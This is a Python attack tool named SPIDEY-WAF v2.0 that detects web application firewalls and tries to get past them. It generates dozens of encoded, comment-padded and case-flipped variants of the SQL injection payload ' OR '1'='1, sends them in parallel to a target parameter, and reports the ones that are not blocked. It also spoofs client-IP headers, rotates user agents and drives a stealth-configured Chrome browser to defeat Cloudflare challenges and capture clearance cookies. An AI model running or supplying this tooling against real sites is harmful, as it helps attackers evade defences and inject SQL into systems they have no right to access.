#!/usr/bin/env python3
"""
SPIDEY-WAF v2.0 - Advanced WAF Detection and Bypass Module
Ultra-Powerful WAF Bypass: Cloudflare, Imperva, ModSecurity, F5, Akamai, and more
Uses 50+ techniques including proxy rotation, header manipulation, encoding chains, and browser automation
"""

import requests
import os
import time
import random
import base64
import hashlib
import uuid
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

# Browser automation imports (optional)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

R, G, Y, B, C = '\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[96m'
X = '\033[0m'

def print_banner():
    """Print ASCII banner"""
    banner_path = os.path.join(os.path.dirname(__file__), 'b.txt')
    try:
        with open(banner_path, 'r') as f:
            print(f.read())
    except:
        pass

class UserAgentRotator:
    """Rotate user agents to evade detection"""
    
    AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (iPad; CPU OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
    ]
    
    @staticmethod
    def get_random():
        return random.choice(UserAgentRotator.AGENTS)

class AdvancedEncodings:
    """Advanced payload encoding techniques"""
    
    @staticmethod
    def url_encode(payload):
        return urllib.parse.quote(payload)
    
    @staticmethod
    def double_url_encode(payload):
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    @staticmethod
    def triple_url_encode(payload):
        return urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(payload)))
    
    @staticmethod
    def hex_encode(payload):
        return '0x' + payload.encode().hex()
    
    @staticmethod
    def unicode_encode(payload):
        return ''.join(f'%u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def html_entity_encode(payload):
        return ''.join(f'&#{ord(c)};' for c in payload)
    
    @staticmethod
    def html_entity_hex_encode(payload):
        return ''.join(f'&#x{ord(c):02x};' for c in payload)
    
    @staticmethod
    def base64_encode(payload):
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def ascii_encode(payload):
        return ''.join(f'chr({ord(c)})' for c in payload)
    
    @staticmethod
    def rot13_encode(payload):
        result = []
        for char in payload:
            if 'a' <= char <= 'z':
                result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
            elif 'A' <= char <= 'Z':
                result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
            else:
                result.append(char)
        return ''.join(result)
    
    @staticmethod
    def case_flip(payload):
        """Flip case randomly"""
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)
    
    @staticmethod
    def null_byte_inject(payload):
        """Insert null bytes"""
        return payload.replace(' ', '%00')
    
    @staticmethod
    def unicode_null(payload):
        return payload + '%00'
    
    @staticmethod
    def comment_chain(payload):
        """Chain comments"""
        return f"/*! {payload} !*/"
    
    @staticmethod
    def hex_char_encode(payload):
        """Convert to hex characters"""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)

class AdvancedHeaders:
    """Advanced header manipulation to bypass WAF"""
    
    BYPASS_HEADERS = {
        'X-Forwarded-For': ['127.0.0.1', '192.168.1.1', '10.0.0.1'],
        'X-Forwarded-Proto': ['http', 'https'],
        'X-Forwarded-Host': ['localhost', '127.0.0.1'],
        'X-Original-URL': ['/', '/index.php'],
        'X-Rewrite-URL': ['/', '/index.php'],
        'X-Original-Host': ['localhost'],
        'X-Client-IP': ['127.0.0.1', '192.168.1.1'],
        'Client-IP': ['127.0.0.1'],
        'X-Real-IP': ['127.0.0.1', '192.168.1.1'],
        'CF-Connecting-IP': ['127.0.0.1'],
        'True-Client-IP': ['127.0.0.1'],
        'X-Originating-IP': ['[127.0.0.1]'],
        'X-Cluster-Client-IP': ['127.0.0.1'],
        'X-ProxyUser-Ip': ['127.0.0.1'],
        'X-Original-IP': ['127.0.0.1'],
        'X-Forwarded-Server': ['localhost'],
        'X-Forwarded-For-Original': ['127.0.0.1'],
        'X-Scanner-For': ['127.0.0.1'],
        'X-Request-ID': [str(uuid.uuid4())],
        'X-Correlation-ID': [str(uuid.uuid4())],
        'X-API-Version': ['v2', 'v3', '2024'],
        'X-App-Version': ['1.0', '2.0'],
        'Referer': ['http://google.com', 'http://github.com'],
        'Accept-Language': ['en-US,en;q=0.9'],
        'Accept-Encoding': ['gzip, deflate, br'],
        'Cache-Control': ['no-cache', 'max-age=0'],
        'Pragma': ['no-cache'],
        'DNT': ['1'],
        'Upgrade-Insecure-Requests': ['1'],
        'Sec-Fetch-Dest': ['document'],
        'Sec-Fetch-Mode': ['navigate'],
        'Sec-Fetch-Site': ['same-origin'],
        'Sec-CH-UA': ['"Not A(Brand";v="99", "Google Chrome";v="120"'],
    }
    
    @staticmethod
    def generate_advanced_headers():
        """Generate advanced header combinations"""
        headers = {
            'User-Agent': UserAgentRotator.get_random(),
        }
        
        # Add random bypass headers
        for header, values in AdvancedHeaders.BYPASS_HEADERS.items():
            if random.choice([True, False]):
                headers[header] = random.choice(values)
        
        return headers

class ProxyRotator:
    """Rotate through proxies"""
    
    # Free proxy list (use with caution - check legality)
    FREE_PROXIES = [
        'http://127.0.0.1:8080',
        'http://localhost:8080',
    ]
    
    @staticmethod
    def get_proxy():
        return random.choice(ProxyRotator.FREE_PROXIES)

class WAFDetector:
    """Detect WAF from HTTP responses"""
    
    SIGNATURES = {
        'Cloudflare': ['cf-ray', 'cloudflare', 'cf_clearance', 'cf-cache-status'],
        'Imperva': ['imperva', 'incapsula', 'x-iinfo', '_incap_js'],
        'ModSecurity': ['mod_security', 'modsecurity', 'your request was blocked'],
        'F5': ['f5', 'bigip', 'x-forwarded-for', 'bigipserver'],
        'Akamai': ['akamai', 'x-akamai', 'akamai-origin-hop'],
        'Sucuri': ['sucuri', 'cloudproxy', 'sucuri_cloudproxy'],
        'Barracuda': ['barracuda', 'barra', 'waf'],
        'DDoS-GUARD': ['ddos-guard', 'ddos'],
        'AWS WAF': ['aws-waf', 'amazon', 'aws'],
        'Wordfence': ['wordfence', 'wfwaf'],
        'SiteLock': ['sitelock'],
    }
    
    @staticmethod
    def detect(url, timeout=5):
        """Detect WAF protecting target"""
        try:
            headers = AdvancedHeaders.generate_advanced_headers()
            r = requests.get(url, headers=headers, timeout=timeout, verify=False)
            
            detected = []
            for waf, sigs in WAFDetector.SIGNATURES.items():
                for sig in sigs:
                    response_text = (r.text + ' ' + str(r.headers)).lower()
                    if sig.lower() in response_text:
                        detected.append(waf)
                        break
            
            if detected:
                print(f"{Y}[!] WAF Detected: {', '.join(set(detected))}{X}")
                return list(set(detected))
            else:
                print(f"{G}[+] No WAF detected{X}")
                return []
        except Exception as e:
            print(f"{R}[-] Detection error: {e}{X}")
            return []

class WAFBypass:
    """Advanced WAF bypass techniques"""
    
    COMMENT_TECHNIQUES = [
        '--', '#', '/*', '/*! */', '-- -a', '-- +',
        '/**/', '/*!50000*/', '/*!40000*/', ';%00',
        '/**//*', '/*!*/', '/*!50000 */', '--/*',
    ]
    
    SPACE_TECHNIQUES = [
        ' ', '/**/', '\t', '\n', '\r', '%09', '%0a', '%0d', 
        '%20', '()', '+', '~', '%2b', '/**//', '%23',
    ]
    
    @staticmethod
    def case_variation(payload):
        variations = [payload, payload.upper(), payload.lower()]
        mixed = ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)
        variations.append(mixed)
        return variations
    
    @staticmethod
    def generate_advanced_bypasses(base_payload):
        """Generate 50+ WAF bypass variations"""
        bypasses = set()
        
        # Basic encoding
        bypasses.add(base_payload)
        bypasses.add(AdvancedEncodings.url_encode(base_payload))
        bypasses.add(AdvancedEncodings.double_url_encode(base_payload))
        bypasses.add(AdvancedEncodings.triple_url_encode(base_payload))
        bypasses.add(AdvancedEncodings.hex_encode(base_payload))
        bypasses.add(AdvancedEncodings.unicode_encode(base_payload))
        bypasses.add(AdvancedEncodings.html_entity_encode(base_payload))
        bypasses.add(AdvancedEncodings.html_entity_hex_encode(base_payload))
        bypasses.add(AdvancedEncodings.base64_encode(base_payload))
        bypasses.add(AdvancedEncodings.rot13_encode(base_payload))
        bypasses.add(AdvancedEncodings.null_byte_inject(base_payload))
        
        # Case variations
        bypasses.update(WAFBypass.case_variation(base_payload))
        
        # Comment injection
        for comment in WAFBypass.COMMENT_TECHNIQUES[:5]:
            bypasses.add(f"{base_payload}{comment}")
            bypasses.add(f"{comment}{base_payload}")
            bypasses.add(f"{base_payload}/*{comment}*/")
        
        # Space bypass
        for space in WAFBypass.SPACE_TECHNIQUES[:5]:
            bypasses.add(base_payload.replace(' ', space))
        
        # Chain encodings
        for first_enc in [AdvancedEncodings.url_encode, AdvancedEncodings.hex_encode]:
            for second_enc in [AdvancedEncodings.double_url_encode, AdvancedEncodings.base64_encode]:
                try:
                    bypasses.add(second_enc(first_enc(base_payload)))
                except:
                    pass
        
        # Comment-space combinations
        for comment in ['/*', '*/']:
            for space in [' ', '%20', '/**/', '%09']:
                bypasses.add(base_payload.replace(' ', f'{comment}{space}{comment}'))
        
        # Parentheses wrapping
        bypasses.add(f"({base_payload})")
        bypasses.add(f"(({base_payload}))")
        
        # Bracket variations
        bypasses.add(f"[{base_payload}]")
        bypasses.add(f"{{{base_payload}}}")
        
        return list(bypasses)

class CloudflareBypass:
    """Advanced Cloudflare bypass using browser automation"""
    
    def __init__(self, url, timeout=30):
        self.url = url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.cookies = None
    
    def bypass_cloudflare_selenium(self, headless=True):
        """Bypass Cloudflare using Selenium with advanced techniques"""
        if not SELENIUM_AVAILABLE:
            print(f"{R}[-] Selenium not installed. Install: pip install selenium{X}")
            return False
        
        try:
            print(f"{C}[*] Initiating advanced Cloudflare bypass...{X}")
            
            # Setup Chrome options
            chrome_options = ChromeOptions()
            if headless:
                chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--start-maximized')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_argument('--disable-web-resources')
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            chrome_options.add_argument(f'user-agent={UserAgentRotator.get_random()}')
            
            print(f"{C}[*] Launching Chrome browser with anti-detection measures...{X}")
            
            try:
                driver = webdriver.Chrome(options=chrome_options)
            except:
                print(f"{Y}[!] Trying with explicit path to chromedriver...{X}")
                driver = webdriver.Chrome(options=chrome_options)
            
            # Set script timeout
            driver.set_script_timeout(self.timeout)
            
            print(f"{C}[*] Navigating to target: {self.url}{X}")
            driver.get(self.url)
            
            print(f"{C}[*] Waiting for page load and challenge completion...{X}")
            
            # Wait for page to fully load
            try:
                WebDriverWait(driver, self.timeout).until(
                    lambda d: d.execute_script('return document.readyState') == 'complete'
                )
                print(f"{G}[+] Page loaded successfully{X}")
            except:
                print(f"{Y}[!] Page load timeout - proceeding anyway{X}")
            
            # Additional wait for challenge
            time.sleep(5)
            
            # Check if Cloudflare challenge was completed
            cf_challenge = driver.execute_script("""
                return {
                    'cf_ray': document.cookie.includes('cf_ray'),
                    'cf_clearance': document.cookie.includes('cf_clearance'),
                    'title': document.title,
                    'ready': document.readyState
                }
            """)
            
            print(f"{C}[*] Page status: {cf_challenge}{X}")
            
            # Extract all cookies
            cookies = driver.get_cookies()
            self.cookies = {c['name']: c['value'] for c in cookies}
            
            # Update session with cookies
            for cookie in cookies:
                self.session.cookies.set(cookie['name'], cookie['value'])
            
            # Check for CF-Clearance
            if 'cf_clearance' in self.cookies or 'cf_ray' in self.cookies:
                print(f"{G}[+] Cloudflare cookies obtained!{X}")
                if 'cf_clearance' in self.cookies:
                    print(f"    CF-Clearance: {self.cookies['cf_clearance'][:50]}...")
                if 'cf_ray' in self.cookies:
                    print(f"    CF-Ray: {self.cookies['cf_ray']}")
            else:
                print(f"{Y}[!] Challenge completed but cookies not found{X}")
            
            # Get user agent from browser
            user_agent = driver.execute_script('return navigator.userAgent')
            self.session.headers.update({'User-Agent': user_agent})
            print(f"{G}[+] Browser User-Agent captured{X}")
            
            driver.quit()
            return True
            
        except Exception as e:
            print(f"{R}[-] Selenium bypass failed: {str(e)}{X}")
            import traceback
            traceback.print_exc()
            return False
    
    def test_with_bypass(self, param, payload, method='GET'):
        """Test request with Cloudflare bypass"""
        try:
            headers = AdvancedHeaders.generate_advanced_headers()
            
            if method.upper() == 'GET':
                r = self.session.get(self.url, params={param: payload}, headers=headers, 
                                    timeout=self.timeout, verify=False)
            else:
                r = self.session.post(self.url, data={param: payload}, headers=headers,
                                     timeout=self.timeout, verify=False)
            
            return r.status_code not in [403, 406, 429]
        except:
            return False

class AdvancedBypassTester:
    """Test advanced bypass techniques with parallelization"""
    
    def __init__(self, url, timeout=10, threads=5):
        self.url = url
        self.timeout = timeout
        self.threads = threads
        self.session = requests.Session()
        self.session.verify = False
    
    def test_single_bypass(self, param, payload, method='GET'):
        """Test single payload"""
        try:
            headers = AdvancedHeaders.generate_advanced_headers()
            
            if method == 'GET':
                r = self.session.get(self.url, params={param: payload}, headers=headers,
                                    timeout=self.timeout, verify=False)
            else:
                r = self.session.post(self.url, data={param: payload}, headers=headers,
                                     timeout=self.timeout, verify=False)
            
            return r.status_code not in [403, 406, 429]
        except:
            return False
    
    def find_working_bypass(self, param, base_payload):
        """Find working bypass using parallel testing"""
        print(f"{C}[*] Generating 50+ advanced bypass payloads...{X}")
        
        bypasses = WAFBypass.generate_advanced_bypasses(base_payload)
        print(f"{C}[*] Generated {len(bypasses)} unique payloads{X}")
        print(f"{C}[*] Testing with {self.threads} parallel threads...{X}\n")
        
        working = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {
                executor.submit(self.test_single_bypass, param, bypass): bypass 
                for bypass in bypasses
            }
            
            for i, future in enumerate(futures):
                bypass = futures[future]
                try:
                    if future.result():
                        print(f"{G}[+] WORKING BYPASS #{len(working)+1}:{X}")
                        print(f"    {bypass[:80]}...")
                        working.append(bypass)
                except:
                    pass
                
                if (i + 1) % 10 == 0:
                    print(f"{C}[*] Tested {i+1}/{len(bypasses)} payloads...{X}")
        
        if working:
            print(f"\n{G}[+] Found {len(working)} working bypass techniques!{X}")
            return working
        else:
            print(f"\n{R}[-] No working bypass found in {len(bypasses)} attempts{X}")
            return None

def main():
    import argparse
    
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='SPIDEY-WAF v2.0 - Advanced WAF Detection & Bypass',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Detect WAF only
  python3 waf_bypass.py -u http://target.com --detect-only
  
  # Test advanced bypasses (50+ techniques)
  python3 waf_bypass.py -u http://target.com -p id --advanced
  
  # Cloudflare bypass with Selenium
  python3 waf_bypass.py -u http://target.com --cloudflare -p id
  
  # Full power mode: Detect + Bypass + Test
  python3 waf_bypass.py -u http://target.com -p id --cloudflare --advanced --threads 10
        '''
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--param', help='Parameter to test')
    parser.add_argument('-m', '--method', default='GET', help='HTTP method (GET/POST)')
    parser.add_argument('-d', '--detect-only', action='store_true', help='Only detect WAF')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout')
    parser.add_argument('--cloudflare', action='store_true', help='Bypass Cloudflare with Selenium')
    parser.add_argument('--selenium', action='store_true', help='Use Selenium for bypass')
    parser.add_argument('--advanced', action='store_true', help='Use 50+ advanced bypass techniques')
    parser.add_argument('--threads', type=int, default=5, help='Number of parallel threads')
    parser.add_argument('--headless', action='store_true', default=True, help='Headless browser mode')
    
    args = parser.parse_args()
    
    print(f"""
{C}╔════════════════════════════════════════════════════════════════════╗{X}
{C}║        SPIDEY-WAF v2.0 - Advanced WAF Detection & Bypass           ║{X}
{C}║        50+ Techniques | Cloudflare | Imperva | ModSecurity         ║{X}
{C}╚════════════════════════════════════════════════════════════════════╝{X}
    """)
    
    print(f"{C}[*] Target: {args.url}{X}\n")
    
    # Detect WAF
    detected = WAFDetector.detect(args.url, args.timeout)
    
    if args.detect_only:
        return
    
    # Cloudflare bypass with Selenium
    if args.cloudflare or args.selenium:
        if detected and ('Cloudflare' in str(detected) or args.cloudflare):
            print(f"\n{C}[*] Attempting advanced Cloudflare bypass...{X}\n")
            cf = CloudflareBypass(args.url, args.timeout)
            if cf.bypass_cloudflare_selenium(headless=args.headless):
                print(f"\n{G}[+] Cloudflare bypassed successfully!{X}")
                
                if args.param:
                    print(f"\n{C}[*] Testing SQL injection through Cloudflare...{X}\n")
                    result = cf.test_with_bypass(args.param, "' OR '1'='1", args.method)
                    if result:
                        print(f"{G}[+] Target is now accessible!{X}")
                    else:
                        print(f"{R}[-] Target still blocking requests{X}")
            else:
                print(f"{R}[-] Cloudflare bypass failed{X}")
    
    # Advanced WAF bypass with 50+ techniques
    if args.advanced:
        if args.param:
            print(f"\n{C}[*] Starting advanced bypass testing...{X}\n")
            tester = AdvancedBypassTester(args.url, args.timeout, args.threads)
            working = tester.find_working_bypass(args.param, "' OR '1'='1")
            
            if working:
                print(f"\n{G}[+] SUCCESS! Use one of these payloads:{X}")
                for i, payload in enumerate(working[:3], 1):
                    print(f"    {i}. {payload[:100]}...")
        else:
            print(f"{Y}[!] Parameter required for advanced testing. Use -p <param>{X}")
    
    elif args.param and not args.detect_only and not args.cloudflare:
        # Default: Advanced mode
        print(f"\n{C}[*] Running in advanced mode (50+ techniques)...{X}\n")
        tester = AdvancedBypassTester(args.url, args.timeout, args.threads)
        tester.find_working_bypass(args.param, "' OR '1'='1")
    
    print(f"\n{C}[*] WAF bypass testing complete.{X}\n")

if __name__ == '__main__':
    main()
